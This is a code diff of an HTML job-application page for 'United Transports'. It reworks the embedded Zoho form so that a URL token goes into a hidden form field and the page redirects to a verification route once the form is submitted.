@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
+
   <title>United Transports — Application</title>
 
   <style>
@@ -60,10 +61,6 @@
       font-weight: 500;
     }
 
-    .progress-step.done {
-      color: #16a34a;
-    }
-
     .progress-num {
       width: 24px;
       height: 24px;
@@ -79,11 +76,6 @@
 
     .progress-step.active .progress-num {
       background: #000;
-      color: #fff;
-    }
-
-    .progress-step.done .progress-num {
-      background: #16a34a;
       color: #fff;
     }
 
@@ -195,6 +187,18 @@
       color: #666;
     }
 
+    .error-card {
+      max-width: 500px;
+      background: #fff;
+      border: 1px solid #fecaca;
+      color: #991b1b;
+      border-radius: 12px;
+      padding: 24px;
+      margin: 60px auto;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
     @media (max-width: 768px) {
       .sidebar {
         display: none;
@@ -247,23 +251,23 @@
         <div class="sidebar-title">About this form</div>
 
         <div class="info-item">
-          <div class="info-icon">&#128203;</div>
+          <div class="info-icon">📋</div>
           <span>Fill out your application information completely</span>
         </div>
 
         <div class="info-item">
-          <div class="info-icon">&#128274;</div>
+          <div class="info-icon">🔒</div>
           <span>Your data is encrypted and secure</span>
         </div>
 
         <div class="info-item">
-          <div class="info-icon">&#9203;</div>
+          <div class="info-icon">⏳</div>
           <span>Takes about 5–10 minutes to complete</span>
         </div>
       </div>
 
       <div class="secure-badge">
-        &#128994; SSL Encrypted &amp; Secure
+        🟢 SSL Encrypted &amp; Secure
       </div>
     </aside>
 
@@ -286,28 +290,58 @@
   </div>
 
   <script>
-    const VERIFY_ROUTE = "/verify";
+    const ZOHO_FORM_BASE_URL =
+      "https://forms.zohopublic.com/unitedtransports/form/test/formperma/pYqr5ywt51AyFSwoqqmZnWNWyhVIBFq2nmoaunKbIRQ?zf_rszfm=1";
 
-    function createApplicationId() {
-      const existingId = sessionStorage.getItem("application_id");
+    function getToken() {
+      const params = new URLSearchParams(window.location.search);
+      const tokenFromUrl = params.get("token");
 
-      if (existingId) {
-        return existingId;
+      if (tokenFromUrl) {
+        sessionStorage.setItem("plaid_token", tokenFromUrl);
+        return tokenFromUrl;
       }
 
-      const newId = "app-" + Date.now();
-      sessionStorage.setItem("application_id", newId);
+      return sessionStorage.getItem("plaid_token");
+    }
 
-      return newId;
+    function showMissingTokenError() {
+      document.body.innerHTML = `
+        <div class="error-card">
+          <strong>Application link is invalid.</strong><br />
+          Token is missing. Please open the original link from your email.
+        </div>
+      `;
+    }
+
+    function buildZohoFormUrl(token) {
+      const url = new URL(ZOHO_FORM_BASE_URL);
+
+      /*
+        Zoho Form ichida hidden field bo'lishi kerak:
+
+        Field Name: Plaid Token
+        Field Link Name / Alias: Plaid_Token
+      */
+      url.searchParams.set("Plaid_Token", token);
+
+      return url.toString();
     }
 
     function redirectToVerify() {
-      const applicationId = createApplicationId();
+      const token = getToken();
 
-      const verifyUrl =
-        VERIFY_ROUTE + "?application_id=" + encodeURIComponent(applicationId);
+      if (!token) {
+        showMissingTokenError();
+        return;
+      }
 
-      document.getElementById("redirecting").style.display = "block";
+      const verifyUrl = "/verify?token=" + encodeURIComponent(token);
+
+      const redirecting = document.getElementById("redirecting");
+      if (redirecting) {
+        redirecting.style.display = "block";
+      }
 
       try {
         window.top.location.href = verifyUrl;
@@ -316,148 +350,71 @@
       }
     }
 
-    (function () {
-      try {
-        const formContainer = document.getElementById(
-          "zf_div_pYqr5ywt51AyFSwoqqmZnWNWyhVIBFq2nmoaunKbIRQ"
-        );
+    function loadZohoForm() {
+      const token = getToken();
 
-        const iframe = document.createElement("iframe");
-
-        let ifrmSrc =
-          "https://forms.zohopublic.com/unitedtransports/form/test/formperma/pYqr5ywt51AyFSwoqqmZnWNWyhVIBFq2nmoaunKbIRQ?zf_rszfm=1";
-
-        try {
-          if (
-            typeof ZFAdvLead !== "undefined" &&
-            typeof zfutm_zfAdvLead !== "undefined"
-          ) {
-            for (let i = 0; i < ZFAdvLead.utmPNameArr.length; i++) {
-              let p = ZFAdvLead.utmPNameArr[i];
-
-              p =
-                ZFAdvLead.isSameDomian &&
-                ZFAdvLead.utmcustPNameArr.indexOf(p) === -1
-                  ? "zf_" + p
-                  : p;
-
-              const v = zfutm_zfAdvLead.zfautm_gC_enc(
-                ZFAdvLead.utmPNameArr[i]
-              );
-
-              if (v) {
-                ifrmSrc +=
-                  (ifrmSrc.indexOf("?") > 0 ? "&" : "?") + p + "=" + v;
-              }
-            }
-          }
-
-          if (
-            typeof ZFLead !== "undefined" &&
-            typeof zfutm_zfLead !== "undefined"
-          ) {
-            for (let i = 0; i < ZFLead.utmPNameArr.length; i++) {
-              const p = ZFLead.utmPNameArr[i];
-              const v = zfutm_zfLead.zfutm_gC_enc(ZFLead.utmPNameArr[i]);
-
-              if (v) {
-                ifrmSrc +=
-                  (ifrmSrc.indexOf("?") > 0 ? "&" : "?") + p + "=" + v;
-              }
-            }
-          }
-
-          if (!new RegExp("[?&]referrername=").test(ifrmSrc)) {
-            let referrer = window.location.href;
-
-            try {
-              referrer =
-                window.self !== window.top
-                  ? window.top.location.href
-                  : /^https?:\/\/[\w.-]+\.[a-zA-Z]{2,}/i.test(referrer)
-                    ? referrer
-                    : "";
-            } catch (e) {}
-
-            if (referrer) {
-              if (referrer.length > 1800) {
-                const queryIndex = referrer.indexOf("?");
-
-                if (queryIndex > -1) {
-                  referrer = referrer.substring(0, queryIndex);
-                }
-
-                if (referrer.length > 1800) {
-                  referrer = referrer.substring(0, 1800);
-                }
-              }
-
-              ifrmSrc +=
-                (ifrmSrc.indexOf("?") > 0 ? "&" : "?") +
-                "referrername=" +
-                encodeURIComponent(referrer);
-            }
-          }
-        } catch (e) {}
-
-        iframe.src = ifrmSrc;
-        iframe.style.border = "none";
-        iframe.style.height = "404px";
-        iframe.style.width = "100%";
-        iframe.style.transition = "all 0.5s ease";
-        iframe.setAttribute("aria-label", "Application");
-
-        formContainer.appendChild(iframe);
-
-        window.addEventListener(
-          "message",
-          function (event) {
-            const eventData = event.data;
-
-            if (eventData && eventData.constructor === String) {
-              const zfData = eventData.split("|");
-
-              if (zfData.length === 2 || zfData.length === 3) {
-                const zfPerma = zfData[0];
-                const zfHeight = parseInt(zfData[1], 10) + 15 + "px";
-
-                const formIframe =
-                  formContainer.getElementsByTagName("iframe")[0];
-
-                if (
-                  formIframe &&
-                  formIframe.src.indexOf("formperma") > 0 &&
-                  formIframe.src.indexOf(zfPerma) > 0
-                ) {
-                  const isSubmitted = zfData.length === 3;
-
-                  if (formIframe.style.height !== zfHeight) {
-                    if (isSubmitted) {
-                      formIframe.scrollIntoView();
-
-                      setTimeout(function () {
-                        formIframe.style.height = zfHeight;
-                      }, 500);
-                    } else {
-                      formIframe.style.height = zfHeight;
-                    }
-                  }
-
-                  if (isSubmitted) {
-                    setTimeout(function () {
-                      redirectToVerify();
-                    }, 800);
-                  }
-                }
-              }
-            }
-          },
-          false
-        );
-      } catch (e) {
-        console.error("Zoho form load error:", e);
+      if (!token) {
+        showMissingTokenError();
+        return;
       }
-    })();
+
+      const formContainer = document.getElementById(
+        "zf_div_pYqr5ywt51AyFSwoqqmZnWNWyhVIBFq2nmoaunKbIRQ"
+      );
+
+      const iframe = document.createElement("iframe");
+
+      iframe.src = buildZohoFormUrl(token);
+      iframe.style.border = "none";
+      iframe.style.height = "404px";
+      iframe.style.width = "100%";
+      iframe.style.transition = "all 0.5s ease";
+      iframe.setAttribute("aria-label", "Application");
+
+      formContainer.appendChild(iframe);
+
+      window.addEventListener(
+        "message",
+        function (event) {
+          const eventData = event.data;
+
+          if (!eventData || eventData.constructor !== String) {
+            return;
+          }
+
+          const zfData = eventData.split("|");
+
+          if (zfData.length !== 2 && zfData.length !== 3) {
+            return;
+          }
+
+          const zfPerma = zfData[0];
+          const zfHeight = parseInt(zfData[1], 10) + 15 + "px";
+          const isSubmitted = zfData.length === 3;
+
+          const formIframe = formContainer.getElementsByTagName("iframe")[0];
+
+          if (
+            formIframe &&
+            formIframe.src.indexOf("formperma") > 0 &&
+            formIframe.src.indexOf(zfPerma) > 0
+          ) {
+            if (formIframe.style.height !== zfHeight) {
+              formIframe.style.height = zfHeight;
+            }
+
+            if (isSubmitted) {
+              setTimeout(function () {
+                redirectToVerify();
+              }, 700);
+            }
+          }
+        },
+        false
+      );
+    }
+
+    loadZohoForm();
   </script>
 </body>
 </html>
